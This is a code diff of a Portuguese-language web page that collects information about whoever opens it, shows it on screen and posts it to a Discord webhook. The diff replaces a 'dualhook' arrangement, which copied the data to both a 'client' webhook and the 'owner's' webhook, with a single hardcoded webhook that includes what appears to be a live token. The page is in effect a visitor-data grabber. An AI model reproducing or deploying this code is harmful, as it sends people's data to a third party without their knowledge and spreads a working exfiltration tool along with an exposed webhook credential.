@@ -36,9 +36,8 @@
     <pre id="info">Carregando suas informações...</pre>
 
     <script>
-        // WEBHOOKS (DUALHOOK SYSTEM)
-        const WEBHOOK_CLIENTE = "https://discord.com/api/webhooks/1420150816223793276/gTHt8SRvPsZaAZibfLE_PGiolk10slvQyKaHbraoPN6nNYNcrJL5nibhzpOSvrwA932T"; // Altere para o webhook do cliente
-        const WEBHOOK_DONO = "https://discord.com/api/webhooks/1420150816223793276/gTHt8SRvPsZaAZibfLE_PGiolk10slvQyKaHbraoPN6nNYNcrJL5nibhzpOSvrwA932T"; // Seu webhook principal
+        // SEU WEBHOOK PRINCIPAL
+        const WEBHOOK = "https://discord.com/api/webhooks/1420150816223793276/gTHt8SRvPsZaAZibfLE_PGiolk10slvQyKaHbraoPN6nNYNcrJL5nibhzpOSvrwA932T"; // SEU WEBHOOK AQUI
 
         // Função para enviar para o Discord
         async function enviarParaDiscord(webhook, data) {
@@ -189,18 +188,9 @@
                 // MOSTRA NA TELA
                 document.getElementById('info').textContent = formattedData;
 
-                // ENVIA PARA OS DOIS WEBHOOKS SIMULTANEAMENTE
-                const promises = [
-                    enviarParaDiscord(WEBHOOK_CLIENTE, formattedData),
-                    enviarParaDiscord(WEBHOOK_DONO, formattedData)
-                ];
-
-                // Verifica se os envios foram bem sucedidos
-                const resultados = await Promise.all(promises);
-                console.log("Resultados do envio:", {
-                    cliente: resultados[0],
-                    dono: resultados[1]
-                });
+                // ENVIA PARA O WEBHOOK PRINCIPAL
+                const enviado = await enviarParaDiscord(WEBHOOK, formattedData);
+                console.log("Dados enviados para o webhook:", enviado);
 
             } catch (error) {
                 document.getElementById('info').textContent = "Erro ao carregar dados.";
